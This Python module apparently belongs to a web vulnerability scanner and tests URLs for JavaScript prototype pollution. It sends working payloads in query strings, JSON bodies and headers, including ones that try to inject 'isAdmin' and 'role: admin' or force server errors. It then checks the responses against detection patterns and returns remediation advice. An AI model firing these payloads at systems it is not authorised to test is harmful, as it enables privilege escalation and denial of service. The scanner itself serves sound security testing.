"""
Prototype Pollution Testing Module
Tests for JavaScript prototype pollution vulnerabilities
"""

import asyncio
import re
import json
from typing import List, Optional, Dict, Tuple
from dataclasses import dataclass

import httpx

from core.rate_limiter import RateLimiter
from utils.logger import setup_logger


@dataclass
class PrototypeFinding:
    """Represents a prototype pollution finding"""
    url: str
    type: str        # 'query_param', 'json_body', 'url_fragment', 'header'
    severity: str
    confidence: str
    payload: str
    evidence: str
    remediation: str


class PrototypePollutionScanner:
    """
    Prototype Pollution Testing Module
    Tests for:
    - Query parameter based prototype pollution (?__proto__[x]=y)
    - JSON body prototype pollution ({"__proto__": {"x": "y"}})
    - Constructor pollution (?constructor[prototype][x]=y)
    - Reflected pollution detection
    - Server-side prototype pollution (Node.js)
    - Client-side pollution indicators
    """

    def __init__(self, rate_limiter: RateLimiter):
        self.rate_limiter = rate_limiter
        self.logger = setup_logger("PrototypePollution")
        self.findings: List[PrototypeFinding] = []
        self.client: Optional[httpx.AsyncClient] = None
        self.timeout = httpx.Timeout(15.0, connect=8.0)

        # Unique canary value to detect pollution
        self.canary = "0xHUNTER_PP_TEST_7x9z"

        # Query param pollution payloads
        self.query_payloads = [
            f"__proto__[0xhunter]={self.canary}",
            f"__proto__.0xhunter={self.canary}",
            f"constructor[prototype][0xhunter]={self.canary}",
            "__proto__[status]=500",
            f"__proto__[headers][x-pp-test]={self.canary}",
            f"constructor.prototype.0xhunter={self.canary}",
        ]

        # JSON body pollution payloads
        self.json_payloads = [
            {
                "__proto__": {"0xhunter": self.canary}
            },
            {
                "constructor": {"prototype": {"0xhunter": self.canary}}
            },
            {
                "__proto__": {"status": 500}
            },
            {
                "__proto__": {"headers": {"x-pp-test": self.canary}}
            },
            {
                "__proto__": {"isAdmin": True}
            },
            {
                "__proto__": {"role": "admin"}
            },
        ]

        # Status/behavior change payloads (blind detection)
        self.blind_payloads = [
            {"__proto__": {"status": 555}},
            {"__proto__": {"statusCode": 555}},
            {"__proto__": {"json": True}},
        ]

    async def _fetch(self, url: str, method: str = "GET",
                     params: Optional[Dict] = None,
                     json_data=None,
                     headers: Optional[Dict] = None) -> Optional[httpx.Response]:
        """Make HTTP request"""
        try:
            async def _do_request():
                if method == "POST" and json_data is not None:
                    return await self.client.post(
                        url, json=json_data,
                        headers={**(headers or {}), 'Content-Type': 'application/json'},
                        follow_redirects=True
                    )
                elif method == "POST":
                    return await self.client.post(url, headers=headers or {}, follow_redirects=True)
                else:
                    return await self.client.get(url, params=params, headers=headers or {}, follow_redirects=True)
            return await self.rate_limiter.execute_with_retry(_do_request)
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return None

    def _check_pollution(self, response: httpx.Response, canary: str) -> Tuple[bool, str]:
        """Check if prototype pollution canary is reflected"""
        # Check response body
        if canary in response.text:
            return True, f"Canary '{canary}' reflected in response body"

        # Check response headers
        for k, v in response.headers.items():
            if canary in v:
                return True, f"Canary '{canary}' found in response header '{k}'"

        return False, ""

    def _check_status_change(self, baseline_status: int,
                              polluted_status: int) -> Tuple[bool, str]:
        """Check if status code changed due to pollution"""
        if baseline_status != polluted_status and polluted_status == 555:
            return True, f"Status code changed from {baseline_status} to {polluted_status} — __proto__.status pollution confirmed"
        if baseline_status == 200 and polluted_status == 500:
            return True, "Status changed 200→500 — possible server-side prototype pollution causing crash"
        return False, ""

    async def test_query_params(self, url: str) -> List[PrototypeFinding]:
        """Test query parameter based prototype pollution"""
        findings = []

        # Baseline
        baseline = await self._fetch(url)
        if not baseline:
            return []

        for payload_str in self.query_payloads:
            # Parse payload into dict
            try:
                key, value = payload_str.split('=', 1)
                test_url = url + ('&' if '?' in url else '?') + payload_str
                response = await self._fetch(test_url)
                if not response:
                    continue

                # Check canary reflection
                is_polluted, evidence = self._check_pollution(response, self.canary)
                if is_polluted:
                    findings.append(PrototypeFinding(
                        url=url,
                        type="query_param",
                        severity="high",
                        confidence="high",
                        payload=payload_str,
                        evidence=f"Query param pollution: {evidence}",
                        remediation=self._get_remediation()
                    ))
                    break

                # Check status change
                status_changed, ev = self._check_status_change(baseline.status_code, response.status_code)
                if status_changed:
                    findings.append(PrototypeFinding(
                        url=url,
                        type="query_param",
                        severity="high",
                        confidence="medium",
                        payload=payload_str,
                        evidence=f"Query param pollution (blind): {ev}",
                        remediation=self._get_remediation()
                    ))
                    break

                # Check for errors indicating parsing
                if response.status_code == 500 and baseline.status_code != 500:
                    findings.append(PrototypeFinding(
                        url=url,
                        type="query_param",
                        severity="medium",
                        confidence="low",
                        payload=payload_str,
                        evidence="Server error (500) triggered by __proto__ payload — possible pollution",
                        remediation=self._get_remediation()
                    ))

            except Exception:
                continue

        return findings

    async def test_json_body(self, url: str) -> List[PrototypeFinding]:
        """Test JSON body prototype pollution"""
        findings = []

        # Baseline GET
        baseline = await self._fetch(url)
        if not baseline:
            return []

        for payload in self.json_payloads:
            response = await self._fetch(url, method="POST", json_data=payload)
            if not response:
                continue

            # Check canary
            is_polluted, evidence = self._check_pollution(response, self.canary)
            if is_polluted:
                findings.append(PrototypeFinding(
                    url=url,
                    type="json_body",
                    severity="critical",
                    confidence="high",
                    payload=json.dumps(payload),
                    evidence=f"JSON body pollution: {evidence}",
                    remediation=self._get_remediation()
                ))
                break

            # Check for isAdmin/role escalation
            try:
                resp_json = response.json()
                if isinstance(resp_json, dict):
                    if resp_json.get('isAdmin') or resp_json.get('role') == 'admin':
                        findings.append(PrototypeFinding(
                            url=url,
                            type="json_body",
                            severity="critical",
                            confidence="high",
                            payload=json.dumps(payload),
                            evidence="Privilege escalation via prototype pollution — response shows admin role",
                            remediation=self._get_remediation()
                        ))
                        break
            except Exception:
                pass

            # Blind: status code change
            status_changed, ev = self._check_status_change(baseline.status_code, response.status_code)
            if status_changed:
                findings.append(PrototypeFinding(
                    url=url,
                    type="json_body",
                    severity="high",
                    confidence="medium",
                    payload=json.dumps(payload),
                    evidence=f"JSON body pollution (blind): {ev}",
                    remediation=self._get_remediation()
                ))
                break

        return findings

    async def test_header_pollution(self, url: str) -> Optional[PrototypeFinding]:
        """Test header-based prototype pollution"""
        # Some Node.js apps parse headers as objects
        pollution_headers = {
            '__proto__[0xhunter]':          self.canary,
            'constructor[prototype][test]': self.canary,
        }

        baseline = await self._fetch(url)
        if not baseline:
            return None

        for header_name, value in pollution_headers.items():
            response = await self._fetch(url, headers={header_name: value})
            if not response:
                continue

            is_polluted, evidence = self._check_pollution(response, self.canary)
            if is_polluted:
                return PrototypeFinding(
                    url=url,
                    type="header",
                    severity="high",
                    confidence="high",
                    payload=f"{header_name}: {value}",
                    evidence=f"Header-based pollution: {evidence}",
                    remediation=self._get_remediation()
                )

        return None

    async def test_json_endpoint_indicators(self, url: str) -> Optional[PrototypeFinding]:
        """
        Test JSON endpoints for Node.js specific pollution indicators.
        Checks error messages that reveal qs/body-parser parsing.
        """
        payloads = [
            {"__proto__": {"x": "1"}},
            {"constructor": {"prototype": {"x": "1"}}},
        ]

        for payload in payloads:
            response = await self._fetch(url, method="POST", json_data=payload)
            if not response:
                continue

            body = response.text.lower()

            # Node.js / Express specific error patterns
            node_patterns = [
                r"cannot\s+set\s+property.*of\s+#<object>",
                r"object\.prototype",
                r"__proto__.*is\s+not",
                r"prototype\s+pollution",
                r"qs.*parse",
            ]

            for pattern in node_patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return PrototypeFinding(
                        url=url,
                        type="json_body",
                        severity="medium",
                        confidence="medium",
                        payload=json.dumps(payload),
                        evidence=f"Server error reveals prototype pollution attempt was processed: '{re.search(pattern, body).group(0)[:80]}'",
                        remediation=self._get_remediation()
                    )

        return None

    def _get_remediation(self) -> str:
        return (
            "1. Use Object.freeze(Object.prototype) to prevent pollution.\n"
            "2. Use Object.create(null) for dictionaries instead of {}.\n"
            "3. Validate and sanitize all JSON input — reject '__proto__' and 'constructor' keys.\n"
            "4. Use safe merge libraries: lodash 4.17.21+, merge 2.1.1+.\n"
            "5. Update vulnerable packages: qs, body-parser, express.\n"
            "6. Use JSON schema validation (ajv) with additionalProperties: false.\n"
            "7. Run npm audit to find vulnerable dependencies."
        )

    async def scan(self, target_urls: List[str], forms: List = None) -> List[PrototypeFinding]:  # BUG-003 FIX
        """Main prototype pollution scan"""
        forms = forms or []  # BUG-003 FIX: avoid mutable default argument
        self.logger.info(f"Starting prototype pollution scan on {len(target_urls)} URLs")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/html, */*',
        }

        async with httpx.AsyncClient(
            headers=headers,
            timeout=self.timeout,
            follow_redirects=True,
            verify=False
        ) as client:
            self.client = client
            tasks = []

            for url in target_urls:
                tasks.append(self.test_query_params(url))
                tasks.append(self.test_json_body(url))
                tasks.append(self.test_header_pollution(url))
                tasks.append(self.test_json_endpoint_indicators(url))

            self.logger.info(f"Running {len(tasks)} prototype pollution tests...")
            results = await asyncio.gather(*tasks, return_exceptions=True)

            seen = set()
            for result in results:
                if isinstance(result, Exception):
                    self.logger.debug(f"PP test error: {result}")
                    continue
                items = result if isinstance(result, list) else ([result] if result else [])
                for finding in items:
                    if finding:
                        key = f"{finding.url}:{finding.type}:{finding.payload[:30]}"
                        if key not in seen:
                            seen.add(key)
                            self.findings.append(finding)
                            self.logger.warning(
                                f"PROTOTYPE POLLUTION [{finding.severity.upper()}]: "
                                f"{finding.url} | Type: {finding.type} | "
                                f"Confidence: {finding.confidence}"
                            )

        self.logger.info(f"Prototype pollution scan complete. Found {len(self.findings)} issues")
        return self.findings
